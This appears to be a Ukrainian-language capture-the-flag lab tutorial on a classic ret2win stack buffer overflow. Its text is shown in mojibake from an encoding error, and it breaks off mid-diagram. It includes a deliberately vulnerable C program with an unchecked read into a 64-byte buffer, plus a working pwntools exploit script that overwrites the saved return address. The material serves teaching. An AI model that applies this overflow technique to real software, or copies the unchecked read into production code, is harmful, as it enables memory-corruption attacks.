# Stage 06: ret2win - –ö–ª–∞—Å–∏—á–Ω–∏–π Buffer Overflow

## üéØ –ú–µ—Ç–∞ –∑–∞–≤–¥–∞–Ω–Ω—è

–û–ø–∞–Ω—É–≤–∞—Ç–∏ **—Å–ø—Ä–∞–≤–∂–Ω—ñ–π buffer overflow** - –Ω–∞–π–∫–ª–∞—Å–∏—á–Ω—ñ—à—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —É –±—ñ–Ω–∞—Ä–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–∞—Ö. –¶–µ –ø–µ—Ä—à–µ –∑–∞–≤–¥–∞–Ω–Ω—è –¥–µ –≤–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î—Ç–µ saved RIP **—Ä–µ–∞–ª—å–Ω–æ —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞**, –∞ –Ω–µ —á–µ—Ä–µ–∑ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π –∫–æ–¥.

## üìö –©–æ –≤–∏ –¥—ñ–∑–Ω–∞—î—Ç–µ—Å—å

- –©–æ —Ç–∞–∫–µ —Å–ø—Ä–∞–≤–∂–Ω—ñ–π buffer overflow (BOF)
- –Ø–∫ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `read()` –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ä–æ–∑–º—ñ—Ä—É
- –ú–µ—Ö–∞–Ω—ñ–∑–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É saved RIP —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è
- –ß–æ–º—É –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –∑–∞—Ö–∏—Å—Ç—ñ–≤ —Ä–æ–±–∏—Ç—å –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é —Ç—Ä–∏–≤—ñ–∞–ª—å–Ω–æ—é
- –†—ñ–∑–Ω–∏—Ü—è –º—ñ–∂ –Ω–∞–≤—á–∞–ª—å–Ω–∏–º–∏ –ø—Ä–∏–∫–ª–∞–¥–∞–º–∏ —Ç–∞ —Ä–µ–∞–ª—å–Ω–∏–º BOF
- –Ø–∫ `return` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π RIP

## üîß –ù–µ–æ–±—Ö—ñ–¥–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

```bash
# Python —Ç–∞ pwntools
pip3 install pwntools

# checksec –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑–∞—Ö–∏—Å—Ç—ñ–≤
sudo apt install checksec

# GDB –¥–ª—è debugging (–æ–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ)
sudo apt install gdb gdb-peda
```

## üìñ –¢–µ–æ—Ä–µ—Ç–∏—á–Ω–∞ –æ—Å–Ω–æ–≤–∞

### –©–æ —Ç–∞–∫–µ Buffer Overflow?

**Buffer Overflow (–ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞)** - –∑–∞–ø–∏—Å –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ –≤–∏–¥—ñ–ª–µ–Ω–æ—ó –ø–∞–º'—è—Ç—ñ –±—É—Ñ–µ—Ä–∞.

```c
char buf[64];           // –í–∏–¥—ñ–ª–µ–Ω–æ 64 –±–∞–π—Ç–∏
read(0, buf, 256);      // ‚ùå –ß–∏—Ç–∞—î–º–æ –¥–æ 256 –±–∞–π—Ç!
                        // –ó–∞–ø–∏—Å—É—î–º–æ –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ buf
```

### –ê–Ω–∞—Ç–æ–º—ñ—è –∞—Ç–∞–∫–∏

```
–ù–û–†–ú–ê–õ–¨–ù–ê –°–ò–¢–£–ê–¶–Ü–Ø (64 –±–∞–π—Ç–∏ –≤–≤–æ–¥—É):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Saved RIP     ‚îÇ  0x7fff...88  ‚Üê –ù–µ —á—ñ–ø–∞—î–º–æ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   Saved RBP     ‚îÇ  0x7fff...80  ‚Üê –ù–µ —á—ñ–ø–∞—î–º–æ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   buf[63]       ‚îÇ  'A'
‚îÇ   ...           ‚îÇ  ...
‚îÇ   buf[0]        ‚îÇ  'A'
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

BUFFER OVERFLOW (80+ –±–∞–π—Ç—ñ–≤):
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Saved RIP     ‚îÇ  0x00401136   ‚Üê –ü–ï–†–ï–ó–ê–ü–ò–°–ê–õ–ò –Ω–∞ win()!
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   Saved RBP     ‚îÇ  'AAAAAAAA'   ‚Üê –ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞–ª–∏ (–Ω–µ –≤–∞–∂–ª–∏–≤–æ)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ   buf[63]       ‚îÇ  'A'
‚îÇ   ...           ‚îÇ  ...
‚îÇ   buf[0]        ‚îÇ  'A'
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

–ö–æ–ª–∏ —Ñ—É–Ω–∫—Ü—ñ—è —Ä–æ–±–∏—Ç—å return:
1. pop    rbp              ; –í—ñ–¥–Ω–æ–≤–ª—é—î RBP (—Ç–µ–ø–µ—Ä 'AAAAAAAA')
2. ret                     ; –ë–µ—Ä–µ –∞–¥—Ä–µ—Å—É –∑—ñ —Å—Ç–µ–∫—É (0x00401136)
3. jmp    [—Ç–æ–π –∞–¥—Ä–µ—Å]      ; –°—Ç—Ä–∏–±–∞—î –Ω–∞ win()!
```

### –ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î?

**–ú–µ—Ö–∞–Ω—ñ–∑–º return:**

```asm
; –ï–ø—ñ–ª–æ–≥ —Ñ—É–Ω–∫—Ü—ñ—ó
mov    rsp, rbp          ; –í—ñ–¥–Ω–æ–≤–ª—é—î–º–æ stack pointer
pop    rbp               ; –í–∏—Ç—è–≥—É—î–º–æ –∑–±–µ—Ä–µ–∂–µ–Ω–∏–π RBP –∑—ñ —Å—Ç–µ–∫—É
ret                      ; ret = pop rip; jmp rip

; ret –¥–µ—Ç–∞–ª—å–Ω—ñ—à–µ:
; 1. rip = [rsp]         –ß–∏—Ç–∞—î 8 –±–∞–π—Ç –∑—ñ —Å—Ç–µ–∫—É
; 2. rsp += 8            –ó–º—ñ—â—É—î stack pointer
; 3. jmp rip             –°—Ç—Ä–∏–±–∞—î –Ω–∞ –∞–¥—Ä–µ—Å—É –∑ rip
```

–Ø–∫—â–æ –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–ª–∏ saved RIP –Ω–∞ `0x401136` (–∞–¥—Ä–µ—Å–∞ win):
```
ret ‚Üí rip = 0x401136 ‚Üí jmp 0x401136 ‚Üí –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è win()!
```

## üíª –ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É —Å–µ—Ä–≤–µ—Ä–∞

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// –§—É–Ω–∫—Ü—ñ—è-—Ü—ñ–ª—å
__attribute__((noreturn)) void win(void){
    puts("FLAG{STAGE6_RET2WIN}");
    fflush(stdout);
    _exit(0);
}

// –í—Ä–∞–∑–ª–∏–≤–∞ —Ñ—É–Ω–∫—Ü—ñ—è
void vuln(void){
    char name[64];                    // –ë—É—Ñ–µ—Ä –Ω–∞ 64 –±–∞–π—Ç–∏
    puts("stage06: send your name");
    ssize_t n = read(0, name, 256);   // ‚ùå –í–†–ê–ó–õ–ò–í–Ü–°–¢–¨! –ß–∏—Ç–∞—î–º–æ –¥–æ 256
    dprintf(1, "hi %.*s\n", (int)(n>0?n:0), name);
}

int main(void){
    setbuf(stdout, NULL);             // –í–∏–º–∏–∫–∞—î–º–æ –±—É—Ñ–µ—Ä–∏–∑–∞—Ü—ñ—é
    vuln();                           // –í–∏–∫–ª–∏–∫–∞—î–º–æ –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ—é
    return 0;                         // ‚Üê –°—é–¥–∏ –º–∏ –Ω–µ –ø–æ–≤–µ—Ä–Ω–µ–º–æ—Å—è!
}
```

### –ü–æ–∫—Ä–æ–∫–æ–≤–∞ –ª–æ–≥—ñ–∫–∞

**–ö—Ä–æ–∫ 1:** `main()` –≤–∏–∫–ª–∏–∫–∞—î `vuln()`

```asm
call   vuln
; 1. push [–∞–¥—Ä–µ—Å–∞ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó]  ‚Üê saved RIP
; 2. jmp vuln
```

**–ö—Ä–æ–∫ 2:** `vuln()` —Å—Ç–≤–æ—Ä—é—î —Å—Ç–µ–∫–æ–≤–∏–π —Ñ—Ä–µ–π–º

```asm
push   rbp                ; –ó–±–µ—Ä—ñ–≥–∞—î–º–æ —Å—Ç–∞—Ä–∏–π RBP
mov    rbp, rsp           ; –ù–æ–≤–∏–π –±–∞–∑–æ–≤–∏–π –ø–æ–∫–∞–∂—á–∏–∫
sub    rsp, 0x50          ; –í–∏–¥—ñ–ª—è—î–º–æ –º—ñ—Å—Ü–µ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö
```

–°—Ç–µ–∫ –∑–∞—Ä–∞–∑:
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚Üê –°—Ç–∞—Ä—à—ñ –∞–¥—Ä–µ—Å–∏
‚îÇ saved RIP       ‚îÇ  (–∞–¥—Ä–µ—Å–∞ –≤ main –ø—ñ—Å–ª—è call vuln)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ saved RBP       ‚îÇ  (—Å—Ç–∞—Ä–µ –∑–Ω–∞—á–µ–Ω–Ω—è RBP)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚Üê RBP (–ø–æ—Ç–æ—á–Ω–∏–π)
‚îÇ name[63]        ‚îÇ
‚îÇ ...             ‚îÇ
‚îÇ name[0]         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚Üê RSP (–ø–æ—Ç–æ—á–Ω–∏–π)
```

**–ö—Ä–æ–∫ 3:** `read(0, name, 256)` —á–∏—Ç–∞—î –¥–∞–Ω—ñ

–Ø–∫—â–æ –º–∏ –≤—ñ–¥–ø—Ä–∞–≤–∏–º–æ 80+ –±–∞–π—Ç:
- –ü–µ—Ä—à—ñ 64 –±–∞–π—Ç–∏ ‚Üí `name[0..63]`
- –ù–∞—Å—Ç—É–ø–Ω—ñ 8 –±–∞–π—Ç ‚Üí **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—é—Ç—å saved RBP**
- –ù–∞—Å—Ç—É–ø–Ω—ñ 8 –±–∞–π—Ç ‚Üí **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—é—Ç—å saved RIP**

**–ö—Ä–æ–∫ 4:** `vuln()` –∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `return`

```asm
leave              ; mov rsp, rbp; pop rbp
ret                ; pop rip; jmp rip
```

`ret` —á–∏—Ç–∞—î **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π saved RIP** –∑—ñ —Å—Ç–µ–∫—É —ñ —Å—Ç—Ä–∏–±–∞—î —Ç—É–¥–∏!

## üöÄ –ü–æ–∫—Ä–æ–∫–æ–≤–µ —Ä—ñ—à–µ–Ω–Ω—è

### –ö—Ä–æ–∫ 1: –ó–±—É–¥—É–π—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫

```bash
cd stage06_ret2win
./build.sh
```

–í–∏–≤—ñ–¥:
```
[*] Building stage06_ret2win...
[+] Built: ../build/stage06_ret2win
[+] Protections:
    - Canary: OFF
    - NX: OFF (execstack enabled)
    - PIE: OFF
    - RELRO: OFF
[+] Classic ret2win challenge - overflow to win() function
```

### –ö—Ä–æ–∫ 2: –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–∞—Ö–∏—Å—Ç–∏

```bash
checksec --file=../build/stage06_ret2win
```

–û—á—ñ–∫—É–≤–∞–Ω–∏–π –≤–∏–≤—ñ–¥:
```
RELRO           STACK CANARY      NX            PIE
No RELRO        No canary found   NX disabled   No PIE (0x400000)
```

**–ü–æ—è—Å–Ω–µ–Ω–Ω—è:**
- ‚ùå **No RELRO** - GOT –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ (–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞—Ä–∞–∑)
- ‚ùå **No canary** - –Ω–µ–º–∞—î –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ BOF
- ‚ùå **NX disabled** - —Å—Ç–µ–∫ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π (–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞—Ä–∞–∑, –º–∏ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ shellcode)
- ‚ùå **No PIE** - –∞–¥—Ä–µ—Å–∏ —Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ, –ª–µ–≥–∫–æ –∑–Ω–∞–π—Ç–∏ win()

–í—Å—ñ –∑–∞—Ö–∏—Å—Ç–∏ **–≤–∏–º–∫–Ω–µ–Ω—ñ** = —ñ–¥–µ–∞–ª—å–Ω—ñ —É–º–æ–≤–∏ –¥–ª—è –Ω–∞–≤—á–∞–Ω–Ω—è!

### –ö—Ä–æ–∫ 3: –ó–Ω–∞–π–¥—ñ—Ç—å –∞–¥—Ä–µ—Å—É win()

```bash
objdump -d ../build/stage06_ret2win | grep '<win>'
```

–ê–±–æ —á–µ—Ä–µ–∑ pwntools:
```python
from pwn import *
elf = ELF('../build/stage06_ret2win')
print(hex(elf.symbols['win']))
```

### –ö—Ä–æ–∫ 4: –°—Ç–≤–æ—Ä—ñ—Ç—å exploit

–§–∞–π–ª `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è
context.arch = 'amd64'
context.log_level = 'info'

# –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫
elf = ELF('../build/stage06_ret2win', checksec=False)

# –û—Ç—Ä–∏–º—É—î–º–æ –∞–¥—Ä–µ—Å—É win()
win_addr = elf.symbols['win']
log.info(f"–ê–¥—Ä–µ—Å–∞ win(): {hex(win_addr)}")

# –ó–∞–ø—É—Å–∫–∞—î–º–æ –ø—Ä–æ—Ü–µ—Å
io = process('../build/stage06_ret2win')

# –ß–∏—Ç–∞—î–º–æ –±–∞–Ω–µ—Ä
io.recvuntil(b'send your name\n')
log.info("–û—Ç—Ä–∏–º–∞–ª–∏ –ø—ñ–¥–∫–∞–∑–∫—É")

# Offset –¥–æ saved RIP (–Ω–∞–¥–∞–Ω–∏–π —É statement)
OFFSET = 72

# –ë—É–¥—É—î–º–æ payload
padding = b'A' * OFFSET
ret_addr = p64(win_addr)
payload = padding + ret_addr

log.info(f"Payload: {OFFSET} –±–∞–π—Ç padding + –∞–¥—Ä–µ—Å–∞ win()")
log.info(f"–î–æ–≤–∂–∏–Ω–∞ payload: {len(payload)} –±–∞–π—Ç")

# –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ exploit
io.sendline(payload)

# –û—Ç—Ä–∏–º—É—î–º–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å
response = io.recvline()
log.info(f"–í—ñ–¥–ø–æ–≤—ñ–¥—å: {response.decode().strip()}")

# –û—Ç—Ä–∏–º—É—î–º–æ –ø—Ä–∞–ø–æ—Ä
flag = io.recvline()
log.success(f"–ü—Ä–∞–ø–æ—Ä: {flag.decode().strip()}")

io.close()
```

### –ö—Ä–æ–∫ 5: –ó–∞–ø—É—Å—Ç—ñ—Ç—å exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

### –ö—Ä–æ–∫ 6: –û—Ç—Ä–∏–º–∞–π—Ç–µ –ø—Ä–∞–ø–æ—Ä

–û—á—ñ–∫—É–≤–∞–Ω–∏–π –≤–∏–≤—ñ–¥:
```
[*] '/path/to/build/stage06_ret2win'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
[*] –ê–¥—Ä–µ—Å–∞ win(): 0x401136
[+] Starting local process
[*] –û—Ç—Ä–∏–º–∞–ª–∏ –ø—ñ–¥–∫–∞–∑–∫—É
[*] Payload: 72 –±–∞–π—Ç padding + –∞–¥—Ä–µ—Å–∞ win()
[*] –î–æ–≤–∂–∏–Ω–∞ payload: 80 –±–∞–π—Ç
[*] –í—ñ–¥–ø–æ–≤—ñ–¥—å: hi AAAAAAA...
[+] –ü—Ä–∞–ø–æ—Ä: FLAG{STAGE6_RET2WIN}
```

## üîç –î–µ—Ç–∞–ª—å–Ω–∏–π —Ä–æ–∑–±—ñ—Ä

## üé¨ –ü–æ–∫–∞–¥—Ä–æ–≤–∞ –∞–Ω—ñ–º–∞—Ü—ñ—è Buffer Overflow

–î–∞–≤–∞–π—Ç–µ –¥–µ—Ç–∞–ª—å–Ω–æ —Ä–æ–∑–≥–ª—è–Ω–µ–º–æ –©–û –°–ê–ú–ï –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –Ω–∞ –∫–æ–∂–Ω–æ–º—É –∫—Ä–æ—Ü—ñ:

### –ö–∞–¥—Ä 0: –ü—Ä–æ–≥—Ä–∞–º–∞ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è

```c
int main(void) {
    vuln();    // –í–∏–∫–ª–∏–∫–∞—î–º–æ –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ—é
    return 0;  // ‚Üê –°—é–¥–∏ –º–∏ –ù–ï –ø–æ–≤–µ—Ä–Ω–µ–º–æ—Å—è!
}
```

**–°—Ç–µ–∫ –ø–µ—Ä–µ–¥ –≤–∏–∫–ª–∏–∫–æ–º vuln():**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê –í–∏—â–∞ –∞–¥—Ä–µ—Å–∞
‚îÇ   ...           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –ö–∞–¥—Ä 1: main() –≤–∏–∫–ª–∏–∫–∞—î vuln()

```asm
; main():
call   vuln
  1. push [–∞–¥—Ä–µ—Å–∞ –Ω–∞—Å—Ç—É–ø–Ω–æ—ó —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó]  ; –ó–±–µ—Ä–µ–≥—Ç–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è
  2. jmp vuln                             ; –°—Ç—Ä–∏–±–Ω—É—Ç–∏ –Ω–∞ vuln
```

**–°—Ç–µ–∫ –ü–Ü–°–õ–Ø call:**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê –í–∏—â–∞ –∞–¥—Ä–µ—Å–∞
‚îÇ 0x00401234      ‚îÇ ‚Üê saved RIP (–∞–¥—Ä–µ—Å–∞ –≤ main –ø—ñ—Å–ª—è call)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ ‚Üê RSP (stack pointer)
‚îÇ   ...           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –ö–∞–¥—Ä 2: vuln() —Å—Ç–≤–æ—Ä—é—î —Å—Ç–µ–∫–æ–≤–∏–π —Ñ—Ä–µ–π–º

```asm
; vuln() –ø—Ä–æ–ª–æ–≥:
push   rbp              ; –ó–±–µ—Ä–µ–≥—Ç–∏ —Å—Ç–∞—Ä–∏–π RBP
mov    rbp, rsp         ; –ù–æ–≤–∏–π –±–∞–∑–æ–≤–∏–π –ø–æ–∫–∞–∂—á–∏–∫
sub    rsp, 0x50        ; –í–∏–¥—ñ–ª–∏—Ç–∏ –º—ñ—Å—Ü–µ (80 –±–∞–π—Ç)
```

**–°—Ç–µ–∫ –ü–Ü–°–õ–Ø –ø—Ä–æ–ª–æ–≥—É:**
```
        –ê–¥—Ä–µ—Å–∞          –ó–Ω–∞—á–µ–Ω–Ω—è        –©–æ —Ü–µ
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x7ffe...88 ‚îÇ 0x00401234      ‚îÇ saved RIP (–ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤ main)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 0x7ffe...80 ‚îÇ 0x7ffe...b0     ‚îÇ saved RBP (—Å—Ç–∞—Ä–µ –∑–Ω–∞—á–µ–Ω–Ω—è RBP)
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§ ‚Üê RBP (–ø–æ—Ç–æ—á–Ω–∏–π base pointer)
‚îÇ 0x7ffe...40 ‚îÇ ????????        ‚îÇ ‚îê
‚îÇ     ...     ‚îÇ ????????        ‚îÇ ‚îÇ name[64]
‚îÇ 0x7ffe...01 ‚îÇ ????????        ‚îÇ ‚îÇ (–Ω–µ—ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ)
‚îÇ 0x7ffe...00 ‚îÇ ????????        ‚îÇ ‚îò
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚Üê RSP (–≤–µ—Ä—à–∏–Ω–∞ —Å—Ç–µ–∫—É)
```

### –ö–∞–¥—Ä 3: read() –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è - –ß–ò–¢–ê–ù–ù–Ø –î–ê–ù–ò–•

```c
char name[64];
read(0, name, 256);  // ‚ùå –ß–∏—Ç–∞—î –î–û 256 –≤ –±—É—Ñ–µ—Ä –Ω–∞ 64!
```

**–ú–ò –í–Ü–î–ü–†–ê–í–õ–Ø–Ñ–ú–û:**
```python
payload = b'A' * 72 + p64(0x401136)
# 72 –±–∞–π—Ç–∏ 'A' + 8 –±–∞–π—Ç –∞–¥—Ä–µ—Å–∏ win()
# –ó–∞–≥–∞–ª–æ–º: 80 –±–∞–π—Ç
```

### –ö–∞–¥—Ä 4: –°—Ç–µ–∫ –ü–Ü–°–õ–Ø read() - –ü–ï–†–ï–ü–û–í–ù–ï–ù–ù–Ø!

```
        –ê–¥—Ä–µ—Å–∞          –©–æ –ë–£–õ–û         –©–æ –°–¢–ê–õ–û
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0x7ffe...88 ‚îÇ 0x00401234      ‚îÇ 0x00401136  ‚îÇ ‚Üê –ü–ï–†–ï–ó–ê–ü–ò–°–ê–ù–û –Ω–∞ win()!
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
